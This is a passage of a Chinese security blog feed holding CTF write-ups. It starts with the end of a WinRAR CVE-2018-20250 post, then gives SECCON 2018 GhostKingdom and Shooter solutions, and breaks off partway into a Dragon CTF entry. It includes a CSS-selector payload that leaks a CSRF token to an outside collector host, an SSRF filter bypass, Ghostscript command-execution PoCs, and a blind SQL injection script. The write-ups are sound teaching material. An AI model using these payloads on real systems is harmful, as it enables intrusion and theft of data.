+&lt;p&gt;关于该漏洞影响的严重性，这个问题之前在某群聊里也引起过群友的讨论，关于该漏洞能否称之为代码执行尚待商榷，但不可否认的是，在适当的条件下，本漏洞带来的任意文件写可能引发极大的安全隐患。比如当攻击者掌握另一个漏洞能触发系统崩溃的时候，此时任意文件写的作用就体现出来了。攻击者可以先将恶意程序写到系统的启动目录再触发系统崩溃，系统自动重启后就会执行该恶意程序，代码执行，完美（理想情况）。或者另一种利用思路是 dll 劫持，即通过覆盖相应 dll 的方式将攻击者编写的恶意 dll 覆盖系统 dll 进而攻击用户。&lt;/p&gt;
+
+&lt;p&gt;在写博客的时候发现了最新的报告 &lt;a href=&#34;http://www.mottoin.com/news/134594.html&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;垃圾邮件利用WinRAR ACE漏洞安装后门程序&lt;/a&gt;，可以看出攻击者也是别出心裁（丧心病狂）了。&lt;/p&gt;
+
+&lt;p&gt;以及再暗暗立个 flag，改天我也要学会用 fuzz 然后 fuzz 出洞来，看大佬一波操作真的酸的不行🍋&lt;/p&gt;
+
+&lt;h2 id=&#34;参考链接&#34;&gt;参考链接&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.anquanke.com/post/id/171374?tdsourcetag=s_pcqq_aiomsg&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;CVE-2018-2025[0-3] WinRAR 代码执行漏洞预警&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://bbs.pediy.com/thread-249613.htm&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;[分享]WinRAR Exploit CVE-2018-20250 漏洞复现&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://research.checkpoint.com/extracting-code-execution-from-winrar/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Extracting a 19 Year Old Code Execution from WinRAR&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/Hz-uN9VEejYN6IHFBtUSRQ&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;首个完整利用WinRAR漏洞传播的恶意样本分析&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>SECCON 2018 - Web Ghostkingdom / Shooter 题解</title>
+      <link>https://syang-ng.github.io/2018/10/seccon-2018-web-ghostkingdom-shooter/</link>
+      <pubDate>Mon, 29 Oct 2018 08:38:00 +0000</pubDate>
+      
+      <guid>https://syang-ng.github.io/2018/10/seccon-2018-web-ghostkingdom-shooter/</guid>
+      <description>
+
+&lt;blockquote&gt;
+&lt;p&gt;文章首发于先知社区 &lt;a href=&#34;https://xz.aliyun.com/t/3075&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://xz.aliyun.com/t/3075&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&#34;ghostkingdom&#34;&gt;ghostkingdom&lt;/h2&gt;
+
+&lt;p&gt;SEECON 2018 唯一的一道 Web 题，不过确实挺好玩的。。&lt;/p&gt;
+
+&lt;p&gt;首先打开题目链接：&lt;a href=&#34;http://ghostkingdom.pwn.seccon.jp/FLAG/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;http://ghostkingdom.pwn.seccon.jp/FLAG/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20181028230757-40a2ab7a-dac3-1.png&#34; alt=&#34;Hint&#34; title=&#34;Hint&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;很明显我们需要 getshell 或者是执行相应的 &lt;code&gt;ls /var/www/html/FLAG&lt;/code&gt; 命令，列出目录下的文件&lt;/p&gt;
+
+&lt;p&gt;然后我们继续往下看题目的功能，首先是最基本的 注册 / 登录：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20181028230821-4f0b7f70-dac3-1.png&#34; alt=&#34;Register&#34; title=&#34;Register&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20181028230836-581f2224-dac3-1.png&#34; alt=&#34;Login&#34; title=&#34;Login&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;进来之后是个很明显的菜单界面：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20181028230852-618da344-dac3-1.png&#34; alt=&#34;Menu&#34; title=&#34;Menu&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;功能如下：
+- Message to admin
+- Take a screenshot
+- Upload image(only localhost)&lt;/p&gt;
+
+&lt;p&gt;然后我们来具体看每项功能：&lt;/p&gt;
+
+&lt;h3 id=&#34;message-to-admin&#34;&gt;Message to admin&lt;/h3&gt;
+
+&lt;p&gt;可以看到第一项功能是向管理员发送消息，我们可以构造两种消息： &lt;code&gt;Normal&lt;/code&gt; 和 &lt;code&gt;Emergency&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20181028230906-6a2a1eec-dac3-1.png&#34; alt=&#34;Message to Admin&#34; title=&#34;Message to Admin&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;但二种本质上是一样的，都是通过 URL 来传递相应参数，我们可以看到 &lt;code&gt;http://ghostkingdom.pwn.seccon.jp/?css=c3BhbntiYWNrZ3JvdW5kLWNvbG9yOnJlZDtjb2xvcjp5ZWxsb3d9&amp;amp;msg=233&amp;amp;action=msgadm2&lt;/code&gt; 和对应的源代码：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;
+&amp;lt;!DOCTYPE html
+	PUBLIC &amp;quot;-//W3C//DTD XHTML 1.0 Transitional//EN&amp;quot;
+	 &amp;quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&amp;quot;&amp;gt;
+&amp;lt;html xmlns=&amp;quot;http://www.w3.org/1999/xhtml&amp;quot; lang=&amp;quot;ja&amp;quot; xml:lang=&amp;quot;ja&amp;quot;&amp;gt;
+&amp;lt;head&amp;gt;
+&amp;lt;title&amp;gt;SECCON 2018&amp;lt;/title&amp;gt;
+&amp;lt;meta http-equiv=&amp;quot;Content-Type&amp;quot; content=&amp;quot;text/html; charset=UTF-8&amp;quot; /&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;body bgcolor=&amp;quot;black&amp;quot;&amp;gt;
+&amp;lt;!-- by KeigoYAMAZAKI, 2018.08.31- --&amp;gt;&amp;lt;style&amp;gt;h2{border:double #668ad8;border-width:6px 0 6px 0;padding:10px;color:#668ad8} .main{background-color:#e1e1e1;color:black;width:85%;padding:60px;margin:40px auto;border:2px solid #C6B665}.msg{padding:15px;border:1px solid black} .ok{color:blue} .warn{color:orange} .err{color:red} .green{background-color:lightgreen} .btn{background:#668ad8;color:white;padding:0.5em;margin:10px} .sshot{border:2px solid white}&amp;lt;/style&amp;gt;&amp;lt;img src=&amp;quot;seccon2018_logo.png&amp;quot;&amp;gt;&amp;lt;div class=&amp;quot;main&amp;quot;&amp;gt;&amp;lt;form action=&amp;quot;?&amp;quot; method=&amp;quot;get&amp;quot;&amp;gt;&amp;lt;style&amp;gt;span{background-color:red;color:yellow}&amp;lt;/style&amp;gt;
+&amp;lt;span class=&amp;quot;msg&amp;quot;&amp;gt;Message: 233&amp;lt;/span&amp;gt;
+&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;csrf&amp;quot; value=&amp;quot;4b51b0980ba510e7f713da&amp;quot;&amp;gt;
+&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;action&amp;quot; value=&amp;quot;msgadm3&amp;quot;&amp;gt;
+&amp;lt;input type=&amp;quot;submit&amp;quot; class=&amp;quot;btn&amp;quot; value=&amp;quot;Send to admin&amp;quot;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;很明显 &lt;code&gt;css=c3BhbntiYWNrZ3JvdW5kLWNvbG9yOnJlZDtjb2xvcjp5ZWxsb3d9&lt;/code&gt; 对应的是字符串 &lt;code&gt;span{background-color:red;color:yellow}&lt;/code&gt;，而 &lt;code&gt;msg=233&lt;/code&gt; 对应 &lt;code&gt;Message: 233&lt;/code&gt;。这里想直接进行 html 标签的注入，但很遗憾发现 &lt;code&gt;&amp;lt;&amp;gt;&lt;/code&gt; 会被转义：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;form action=&amp;quot;?&amp;quot; method=&amp;quot;get&amp;quot;&amp;gt;&amp;lt;style&amp;gt;&amp;amp;lt;/sytle&amp;amp;gt;
+&amp;lt;/style&amp;gt;
+&amp;lt;span class=&amp;quot;msg&amp;quot;&amp;gt;Message: &amp;amp;lt;/span&amp;amp;gt;&amp;lt;/span&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;那么 xss 的注入点被限制到了很小的范围，我们仅能通过 &lt;code&gt;&amp;lt;style&amp;gt;span {background: url(xxx)}&amp;lt;/style&amp;gt;&lt;/code&gt; 的方式发起特定的 GET 请求，虽然看上去用处不大，但会在后续的解题中使用。&lt;/p&gt;
+
+&lt;h3 id=&#34;take-a-screenshot&#34;&gt;Take a screenshot&lt;/h3&gt;
+
+&lt;p&gt;第二项功能比较简单，程序会去访问你指定的 URL 并将相应的结果返回：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20181028230932-793363ee-dac3-1.png&#34; alt=&#34;SShot&#34; title=&#34;Shot&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20181028230944-80ce6590-dac3-1.png&#34; alt=&#34;SShot2&#34; title=&#34;SShot2&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;很明显，这里存在着 SSRF，我们可以通过该操作触发服务端的访问，如通过访问 &lt;code&gt;http://localhost&lt;/code&gt; 来查看从 localhost 端登录的效果，但这里存在着一个限制：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;You can not use URLs that contain the following keywords: 127, ::1, local
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;绕过的方式有很多种，我用来 &lt;code&gt;http://0.0.0.0&lt;/code&gt; 来绕过该限制：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20181028231025-98e4a72a-dac3-1.png&#34; alt=&#34;Localhost&#34; title=&#34;Localhost&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;xss-ssrf&#34;&gt;XSS + SSRF&lt;/h2&gt;
+
+&lt;p&gt;我们现在已知了本题存在的两个利用点：XSS 和 SSRF，下面需要思考的是利用这两个点来做什么文章。&lt;/p&gt;
+
+&lt;p&gt;很明显，我们需要想办法让我们在题目环境外访问到 &lt;em&gt;Upload image&lt;/em&gt; 这项功能，通过尝试之后发现通过 &lt;code&gt;X-Forwarded-For&lt;/code&gt; 等 header 无效，也无法通过 SSRF 来间接访问，因为相应的回显仅仅是一张截图，无法进行任何操作。&lt;/p&gt;
+
+&lt;p&gt;此时，我们关注到这么一个现象，即我们的 &lt;code&gt;Cookie: CGISESSID=405b0d4750c3371e26f519&lt;/code&gt; 和 Preview 页面的 csrf token 一致，那么是不是等价于我们只要获得了相应的 csrf token，即可通过修改 cookie 的方式切换登录的状态。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20181028231040-a20ead14-dac3-1.png&#34; alt=&#34;csrf&#34; title=&#34;csrf&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;此时想到了 Google CTF 一道题 cat chat 的思路，利用 css 选择器进行 xss，泄露出页面的敏感信息。在这里，我们需要泄露的敏感信息是 &lt;code&gt;&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;csrf&amp;quot; value=&amp;quot;48cab678ef3b27b008e60d&amp;quot;&amp;gt;&lt;/code&gt; 标签的 value 信息，所以我们可以这样来写 payload：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-css&#34;&gt;input[value^=&amp;quot;0&amp;quot;] {background: url(http://server?csrf=0)}
+input[value^=&amp;quot;1&amp;quot;] {background: url(http://server?csrf=1)}
+input[value^=&amp;quot;2&amp;quot;] {background: url(http://server?csrf=2)}
+input[value^=&amp;quot;3&amp;quot;] {background: url(http://server?csrf=3)}
+input[value^=&amp;quot;4&amp;quot;] {background: url(http://server?csrf=4)}
+input[value^=&amp;quot;5&amp;quot;] {background: url(http://server?csrf=5)}
+input[value^=&amp;quot;6&amp;quot;] {background: url(http://server?csrf=6)}
+input[value^=&amp;quot;7&amp;quot;] {background: url(http://server?csrf=7)}
+input[value^=&amp;quot;8&amp;quot;] {background: url(http://server?csrf=8)}
+input[value^=&amp;quot;9&amp;quot;] {background: url(http://server?csrf=9)}
+input[value^=&amp;quot;a&amp;quot;] {background: url(http://server?csrf=a)}
+input[value^=&amp;quot;b&amp;quot;] {background: url(http://server?csrf=b)}
+input[value^=&amp;quot;c&amp;quot;] {background: url(http://server?csrf=c)}
+input[value^=&amp;quot;d&amp;quot;] {background: url(http://server?csrf=d)}
+input[value^=&amp;quot;e&amp;quot;] {background: url(http://server?csrf=e)}
+input[value^=&amp;quot;f&amp;quot;] {background: url(http://server?csrf=f)}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;只要 value 的值和猜测中的一项成功匹配，我们即可从自己的服务器接收到相应数据，然后每次猜测 csrf token 的一位，共需猜解 22 位。但由于 Send to admin 功能是无效的，我们必须用第二部分介绍的 SSRF 触发 XSS 操作。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20181028231053-a9b924c2-dac3-1.png&#34; alt=&#34;token&#34; title=&#34;token&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;为了方便操作，可以利用 python 帮助我们构造 payload:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def getBase64(s):
+    z = []
+    for i  in  &#39;0123456789abcdef&#39;:
+        st = s + i
+        z.append(&#39;input[value^=&amp;quot;{}&amp;quot;] {{background: url(http://server?csrf={})}}&#39;.format(st, st))
+    return base64.b64encode(&#39;\n&#39;.join(z))
+
+def formatURL(s):
+    return &amp;quot;http://0.0.0.0/?css={}&amp;amp;action=msgadm2&amp;quot;.format(s)
+
+formatURL(getBase64(&#39;&#39;))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;PS：不知道为什么我爆到前 14 位就会卡住，所以后 8 位可以从尾部开始匹配：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def getBase64(s):
+    z = []
+    for i  in  &amp;quot;0123456789abcdef&amp;quot;:
+        st =   i+s
+        z.append(&#39;input[value$=&amp;quot;{}&amp;quot;] {{background: url(http://5ax2cw.ceye.io?csrf={})}}&#39;.format(st, st))
+    return base64.b64encode(&#39;\n&#39;.join(z))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;操作过程如下：
+1. 通过 SSRF 访问 &lt;a href=&#34;http://0.0.0.0/?user=密码&amp;amp;pass=账号&amp;amp;action=login&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;http://0.0.0.0/?user=密码&amp;amp;pass=账号&amp;amp;action=login&lt;/a&gt; 在服务端登录
+2. 通过 SSRF 访问 &lt;a href=&#34;http://0.0.0.0/?css=payload&amp;amp;action=msgadm2&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;http://0.0.0.0/?css=payload&amp;amp;action=msgadm2&lt;/a&gt; 触发 XSS，逐个字节爆破你的 cookie&lt;/p&gt;
+
+&lt;p&gt;（PS:之所以要先登录是因为你想要获得的是你在 localhost 状态下的 cookie，所以你必须在远端触发一次登录操作&lt;/p&gt;
+
+&lt;p&gt;成功获得 cookie: &lt;code&gt;405b0d4750c3371e26f519&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20181028231121-baa0bbc4-dac3-1.png&#34; alt=&#34;Menu2&#34; title=&#34;Menu2&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;ghostscript&#34;&gt;GhostScript&lt;/h2&gt;
+
+&lt;p&gt;现在我们终于可以上传图片了，首先任意上传一张错误的图片：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20181028231135-c2715598-dac3-1.png&#34; alt=&#34;Upload&#34; title=&#34;Upload&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20181028231146-c95adc76-dac3-1.png&#34; alt=&#34;Upload2&#34; title=&#34;Upload2&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;然后尝试触发 &lt;strong&gt;Convert to GIF format&lt;/strong&gt;，得到报错：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;convert: Not a JPEG file: starts with 0x62 0x6f `/var/www/html/images/05b12f2ee7ee7192e645c705fe50d1dc.jpg&#39; @ error/jpeg.c/JPEGErrorHandler/316. convert: no images defined `/var/www/html/images/05b12f2ee7ee7192e645c705fe50d1dc.gif&#39; @ error/convert.c/ConvertImageCommand/3046. 
+/images/05b12f2ee7ee7192e645c705fe50d1dc.gif
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;根据报错搜索可以得到相应程序使用的库：imagemagick，然后继续搜索 imagemagick 相关的漏洞，得到 &lt;a href=&#34;https://www.secrss.com/articles/4753&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Ghostscript命令执行漏洞&lt;/a&gt;，结合题目标题 ghostkingdom，很明显地提示了相应考点：ghostscript 的命令执行。&lt;/p&gt;
+
+&lt;p&gt;于是从网上借鉴一个 POC:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-ghostscript&#34;&gt;%!PS
+userdict /setpagedevice undef
+legal
+{ null restore } stopped { pop } if
+legal
+mark /OutputFile (%pipe%$(ls /var/www/html/FLAG/)) currentdevice putdeviceprops
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;列出目录后得到 flag 文件名为 &lt;code&gt;FLAGflagF1A8.txt&lt;/code&gt;，继续构造，获得 flag&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-ghostscript&#34;&gt;%!PS
+userdict /setpagedevice undef
+legal
+{ null restore } stopped { pop } if
+legal
+mark /OutputFile (%pipe%$(cat /var/www/html/FLAG/FLAGflagF1A8.txt)) currentdevice putdeviceprops
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
+
+&lt;p&gt;本题结合了 XSS / SSRF / GhostScript 命令执行漏洞，环环相扣，可以说是非常有趣了。另外听说貌似还有道表面 Reverse 题，考的是 SQL 注入，有空做了继续贴在这里。。&lt;/p&gt;
+
+&lt;h2 id=&#34;shooter&#34;&gt;Shooter&lt;/h2&gt;
+
+&lt;p&gt;当初以为这道题既然只挂了 RE，肯定还是道 Reverse 题目，没想到后半部分还真的是道 Web，坑队友了…当时说账户密码是不是还藏在 apk 文件里什么的…&lt;/p&gt;
+
+&lt;p&gt;前面 Re 的部分不再赘述（毕竟不会），我们来看后半部分的 SQL 注入部分。首先是关注到这样一个链接：&lt;a href=&#34;http://staging.shooter.pwn.seccon.jp/admin/sessions/new&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;http://staging.shooter.pwn.seccon.jp/admin/sessions/new&lt;/a&gt; ，是个登录界面：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20181031131750-4ff44cd6-dccc-1.png&#34; alt=&#34;Inject&#34; title=&#34;Inject&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;由于是复现的就只关注写脚本了，哪位大佬能告诉我是怎么 fuzz 出注入点的，完全不会（哭泣&lt;/p&gt;
+
+&lt;p&gt;总之在 password 使用 &lt;code&gt;&#39;))) union select 1#&lt;/code&gt; 可以登录成功，但很明显的由于没有回显，所以只能尝试盲注。可以注意到 &lt;code&gt;&#39;))) union select 1#&lt;/code&gt; 和 &lt;code&gt;&#39;))) union select NULL#&lt;/code&gt; 是两种不同的结果，前者显示登录成功，后者则是回到该页面继续登录，所以可以根据这一特点进行盲注，盲注脚本如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import string
+import requests
+from bs4 import BeautifulSoup
+
+s = requests.Session()
+
+def judge(text):
+    return len(text) &amp;lt; 1772
+
+def get(url):
+    return s.get(url)
+
+def post(url, data):
+    return s.post(url, data=data)
+
+def test(payload):
+    text = get(&#39;http://staging.shooter.pwn.seccon.jp/admin/sessions/new&#39;).text
+    html = BeautifulSoup(text, &#39;lxml&#39;)
+    inputs = html.find_all(&#39;input&#39;)
+    csrf_token = inputs[1][&#39;value&#39;]
+
+    data = {
+        &#39;authenticity_token&#39;: csrf_token,
+        &#39;login_id&#39;: &#39;admin&#39;,
+        &#39;password&#39;: payload,
+        &#39;commit&#39;: &#39;Login&#39;
+    }
+
+    return post(&#39;http://staging.shooter.pwn.seccon.jp/admin/sessions&#39;, data)
+
+def blind_inject(s):
+    r = &#39;&#39;
+    while True:
+        left = 0
+        right = 128
+        while left &amp;lt;= right:
+            mid = (left + right) // 2
+            c = chr(mid)
+            if c == &amp;quot;&#39;&amp;quot; or c == &amp;quot;#&amp;quot;:
+                mid += 1
+                c = chr(mid)
+            payload = s.format(len(r)+1, c)
+            if judge(test(payload).text):
+                left = mid + 1
+            else:
+                right = mid - 1
+        if left == 0 or left == 32:
+            break
+        else:
+            print(left)
+        r += chr(left)
+        print(r)
+    return r
+
+def main():
+    # database: SHOOTER_STAGING
+    # blind_inject(&amp;quot;&#39;))) union SELECT if(SUBSTR(database(),{},1) &amp;gt; &#39;{}&#39;, 1, NULL)#&amp;quot;)
+    #
+    # table: AR_INTERNAL_METADATA,FLAGS ...
+    # blind_inject(&amp;quot;&#39;))) union SELECT if(substr((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),{},1) &amp;gt; &#39;{}&#39;, 1, NULL)#&amp;quot;)
+    #
+    # column: ID,VALUE,CREATED_AT,UPDATED_AT
+    # blind_inject(&amp;quot;&#39;))) union SELECT if(substr((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = &#39;flags&#39;), {},1) &amp;gt; &#39;{}&#39;, 1, NULL)#&amp;quot;)
+    #
+    # flag
+    blind_inject(&amp;quot;&#39;))) union SELECT if(substr((SELECT value FROM flags where id = 1), {},1) &amp;gt; &#39;{}&#39;, 1, NULL)#&amp;quot;)
+
+if __name__ == &#39;__main__&#39;:
+    main()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;最后获得 flag：SECCON{1NV4L1D_4DM1N_P4G3_4U+H3NT1C4T10N}&lt;/p&gt;
+
+&lt;h2 id=&#34;参考文章&#34;&gt;参考文章&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://bbs.ichunqiu.com/thread-44747-1-1.html&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;ghostscript命令执行复现POC&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.anquanke.com/post/id/157513&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://www.anquanke.com/post/id/157513&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://uuzdaisuki.com/2018/08/22/GhostScript%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;GhostScript命令执行漏洞&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://graneed.hatenablog.com/entry/2018/10/28/150722&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;GhostKingdom writeup by noraneco&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/PDKT-Team/ctf/tree/master/seccon2018/shooter&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;shooter writeup by PDKT&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Dragon CTF Web 部分 Writeup</title>
+      <link>https://syang-ng.github.io/2018/09/dragonctf-web-writeup/</link>
+      <pubDate>Sun, 30 Sep 2018 20:01:34 +0000</pubDate>
+      
+      <guid>https://syang-ng.github.io/2018/09/dragonctf-web-writeup/</guid>
+      <description>
+
+&lt;h2 id=&#34;3nterprise-s0lution&#34;&gt;3NTERPRISE s0lution&lt;/h2&gt;
+
+&lt;p&gt;题目直接给出了源码，我已经贴在了 gist 上：&lt;a href=&#34;https://gist.github.com/syang2forever/b90c36a66b7f826010d05be13d83d2a6&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://gist.github.com/syang2forever/b90c36a66b7f826010d05be13d83d2a6&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;下面来看题目，进来之后是个很明显的 &lt;code&gt;登录&lt;/code&gt;/&lt;code&gt;注册&lt;/code&gt; 界面，审计完代码后确认题目利用点应该不是此处，那随意注册个名字登录即可：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/DragonCTF-Web-Writeup/view1.png&#34; alt=&#34;view 1&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;进入后我们可以看到题目提供的功能，主要有以下两项：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;发布一个 note&lt;/li&gt;
+&lt;li&gt;查看发布的 note&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/DragonCTF-Web-Writeup/view2.png&#34; alt=&#34;view 2&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;发布的 note 会被自动分配一个 id，那很自然的想到尝试访问 id 为 1 的页面：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/DragonCTF-Web-Writeup/view3.png&#34; alt=&#34;view 3&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到该页面是由 admin 发布的，但显示的是一段密文，然后页面会进行解密（并得到错误的结果）&lt;/p&gt;
+
+&lt;p&gt;查看页面源代码，可以发现执行的是异或加密的解密过程，页面会从 &lt;a href=&#34;http://solution.hackable.software:8080/note/getkey&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;http://solution.hackable.software:8080/note/getkey&lt;/a&gt; 处请求对应的密钥&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;textarea rows=20 cols=40 id=&amp;quot;note_data&amp;quot;&amp;gt;07D8B68CDB92A687DFC74217C9D7F47E84540A3C97BA3D2B8B5B3E1C110A4C54F09392ADC910461BF61AA4AC6D921591556D1AAFCB8495144C27748369FC101847D7C2A9508F6534FFB7BCF859FD3ED8863611400F9ECB56064C20EDF0B6F6B1BF1CBB522A91F0C9B2&amp;lt;/textarea&amp;gt;&amp;lt;br&amp;gt;
+&amp;lt;div id=&amp;quot;konsole&amp;quot;&amp;gt;
+  Note encrypted ... &amp;lt;br&amp;gt;
+&amp;lt;/div&amp;gt;
+&amp;lt;script&amp;gt;
+  var org_content = &#39;&#39;;
+  var pos = 0;
+  function ll(msg){ jQuery(&amp;quot;#konsole&amp;quot;).append(&amp;quot;[+] &amp;quot; + msg + &amp;quot;&amp;lt;br&amp;gt;&amp;quot;); }
+  window.setTimeout(function(){ fetch_key() }, 1000)
+  function fetch_key(){
+    ll(&amp;quot;getting key ... &amp;quot;);
+    jQuery.get(
+      &amp;quot;/note/getkey&amp;quot;, 
+      function(data){
+        ll(&amp;quot;got key ...&amp;quot;);
+        window.setTimeout(function(){ decode(data.key); }, 1000)
+      }
+    )
+  }
+
+  function hex_to_ascii(str1){
+    var hex  = str1.toString();
+    var str = &#39;&#39;;
+    for (var n = 0; n &amp;lt; hex.length; n += 2) {
+      str += String.fromCharCode(parseInt(hex.substr(n, 2), 16));
+    }
+    return str;
+  }
+
+  function decode(key){
+    ll(&amp;quot;decoding ... &amp;quot;);
+    var note = jQuery(&amp;quot;#note_data&amp;quot;)
+    window.hex_content = note.val();
+    window.pos = 0;
+    window.org_content = hex_to_ascii(window.hex_content);
+    window.key_content = hex_to_ascii(key);
+    window.key_len = key.length;
+    window.plaintext = &#39;&#39;;
+    note.val(&#39;&#39;);
+    decode_iter();
+  }
+  function decode_iter(){
+    var note = jQuery(&amp;quot;#note_data&amp;quot;);
+    if (window.pos &amp;gt;= window.org_content.length){
+      return ll(&amp;quot;Done !&amp;quot;);
+    }
+    c1 = window.org_content.charCodeAt(pos);
+    c2 = window.key_content.charCodeAt(pos % window.key_len);
